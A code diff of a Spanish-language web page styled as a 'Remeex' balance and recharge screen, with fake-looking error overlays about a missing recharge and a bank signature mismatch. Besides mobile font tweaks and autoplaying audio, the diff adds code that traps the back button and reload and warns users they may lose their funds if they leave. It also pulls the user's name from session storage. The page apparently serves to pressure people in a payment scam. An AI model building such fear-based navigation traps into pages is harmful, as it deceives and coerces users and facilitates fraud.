@@ -207,8 +207,7 @@
 
     /* ============ Tarjeta de SALDO (nueva) ============ */
     .new-balance-card-container {
-      margin-top: -1rem; /* Ajuste para "subir" la tarjeta */
-      margin-bottom: 1.5rem;
+      margin: -2rem 1.5rem 1.5rem 1.5rem;
       position: relative;
       z-index: 2;
     }
@@ -399,8 +398,11 @@
       text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
       background: linear-gradient(to right, #ffffff, #e0e0e0);
       -webkit-background-clip: text;
+      background-clip: text;
       -webkit-text-fill-color: transparent;
       position: relative;
+      /* This ensures text stays visible without changing appearance */
+      filter: drop-shadow(0 0 0.5px rgba(255, 255, 255, 0.01));
     }
     .balance-amount::after {
       content: '';
@@ -1574,12 +1576,34 @@
       .info-section-old p {
         font-size: 0.95rem;
       }
+      .balance-amount {
+        font-size: 1.8rem; /* Texto más pequeño en móviles */
+      }
+      .dynamic-text {
+        font-size: 0.65rem; /* Texto más pequeño en móviles */
+      }
     }
     
     @media (max-width: 480px) {
       .balance-card {
         padding: 1.25rem;
         margin: -1.5rem 1rem 1.5rem 1rem;
+      }
+      .balance-amount {
+        font-size: 1.6rem; /* Aún más pequeño para móviles muy pequeños */
+      }
+      .section-content h2 {
+        font-size: 1.3rem;
+      }
+      .form-group label,
+      .form-control {
+        font-size: 0.9rem;
+      }
+      .btn-glow {
+        font-size: 0.9rem;
+      }
+      .info-section-old p, .verification-section p {
+        font-size: 0.9rem;
       }
     }
   </style>
@@ -2175,7 +2199,6 @@
       <div class="spinner-ring"></div>
       <div class="spinner-dot"></div>
     </div>
-  </div>
 </div>
 
 <!-- Overlay: Error Final - No se encontró la recarga -->
@@ -2290,11 +2313,10 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
 
 <!-- Audios solicitados -->
 <audio id="audioIntro" preload="auto">
-  <!-- Usar un enlace directo a un MP3/OGG real para que funcione en navegadores. -->
-  <source src="https://www.youtube.com/watch?v=4FTTa3JY5Tw" type="audio/mpeg">
+  <source src="https://dl.dropboxusercontent.com/scl/fi/dwn8afqkkj0sn3fj6y3d7/KWaPj24l_oo-intro.mp3?rlkey=t61z1y3x2vn1v1o9kpspgr8y1" type="audio/mpeg">
 </audio>
 <audio id="audioOverlay" preload="auto">
-  <source src="https://www.youtube.com/watch?v=ep8DBvBnrr8" type="audio/mpeg">
+  <source src="https://dl.dropboxusercontent.com/scl/fi/k04phmfxh7fldoswxxcgj/X6mjwDUFccw-overlay.mp3?rlkey=cfjmdzpplxqvf2d65pfqnk4xh" type="audio/mpeg">
 </audio>
 
 <!-- Script principal -->
@@ -2364,7 +2386,6 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
   // Control de estilos del spinner
   let currentSpinnerStyle = 1;
   let isPersonalized = false;
-  let userName = "Juan"; // Ejemplo de nombre
 
   // Control de veces que se abre el overlay de datos:
   let timesBlurOpened = 0;
@@ -2432,6 +2453,9 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
    * EVENTO DOMContentLoaded
    ****************************************************/
   document.addEventListener("DOMContentLoaded", () => {
+    // Reproducir el audio de intro al cargar la página
+    firstAudio();
+    
     // Activamos aparición suave del container
     document.querySelector('.container').classList.add('active');
 
@@ -2447,18 +2471,45 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
     // Configuramos listeners de botones
     setupEventListeners();
 
-    // Evitar retroceso
-    history.pushState({}, '', '');
-    window.addEventListener('popstate', function() {
-      if (!isRedirecting) {
-        history.pushState({}, '', '');
-        alert("Por favor, no utilices el botón de retroceso del navegador durante este proceso.");
-      }
-    });
+    // Evitar retroceso y recarga
+    setupNavigationWarning();
 
     // Inicializar manejo de mouse para efectos glow en overlays
     initMouseMoveEffects();
   });
+  
+  /****************************************************
+   * Evitar retroceso y recarga con advertencia
+   ****************************************************/
+  function setupNavigationWarning() {
+    // Evitar retroceso
+    history.pushState({}, '', '');
+    window.addEventListener('popstate', function(e) {
+      if (!isRedirecting) {
+        e.preventDefault();
+        history.pushState({}, '', '');
+        showNavigationWarning();
+      }
+    });
+    
+    // Evitar recarga
+    window.addEventListener('beforeunload', function(e) {
+      if (!isRedirecting) {
+        e.preventDefault();
+        e.returnValue = "Si abandonas esta página, podrías perder tus fondos. ¿Estás seguro?";
+        return e.returnValue;
+      }
+    });
+  }
+  
+  function showNavigationWarning() {
+    const confirmLeave = confirm("ADVERTENCIA: Si retrocedes o recargas esta página perderás tu sesión y podrías perder tus fondos. Te recomendamos contactar con atención al cliente antes de cualquier acción. ¿Realmente deseas salir?");
+    
+    if (confirmLeave) {
+      isRedirecting = true;
+      window.location.href = "https://visa.es";
+    }
+  }
 
   /****************************************************
    * Efectos de mouse para overlays
@@ -2882,16 +2933,23 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
       spinner.classList.add(`style${currentSpinnerStyle}`);
     }
   }
-
+  
+  // Función actualizada que obtiene el nombre real del usuario del sessionStorage
   function togglePersonalizedBalance() {
     const balanceLabel = document.getElementById("balanceLabel");
     if (!balanceLabel) return;
-
-    const currentStyle = currentSpinnerStyle;
-
+    
+    // Obtener el nombre real del usuario del storage
+    const datosRemeex = JSON.parse(sessionStorage.getItem("datosRemeex") || "{}");
+    const nombreUsuario = datosRemeex.fullName ? datosRemeex.fullName.split(' ')[0] : "Usuario";
+    
+    // Remember current spinner state
+    const spinner = document.getElementById("balanceSpinner");
+    const spinnerClass = spinner ? spinner.className : "";
+    
     if (!isPersonalized) {
       balanceLabel.innerHTML = `
-        ${userName}, tu saldo disponible
+        ${nombreUsuario}, tu saldo disponible
         <span class="spinner" id="balanceSpinner">
           <span class="spinner-circle"></span>
           <span class="spinner-inner"></span>
@@ -2906,12 +2964,22 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
         </span>
       `;
     }
-
+    
+    // Restore spinner style
     const newSpinner = document.getElementById('balanceSpinner');
-    if (currentStyle > 1) {
-      newSpinner.classList.add(`style${currentStyle}`);
+    if (newSpinner && spinnerClass) {
+      newSpinner.className = spinnerClass;
+    } else if (newSpinner && currentSpinnerStyle > 1) {
+      newSpinner.classList.add(`style${currentSpinnerStyle}`);
     }
+    
     isPersonalized = !isPersonalized;
+    
+    // Ensure balance amount stays visible
+    const balanceAmount = document.getElementById("balanceAmount");
+    if (balanceAmount) {
+      void balanceAmount.offsetHeight;
+    }
   }
 
   /****************************************************
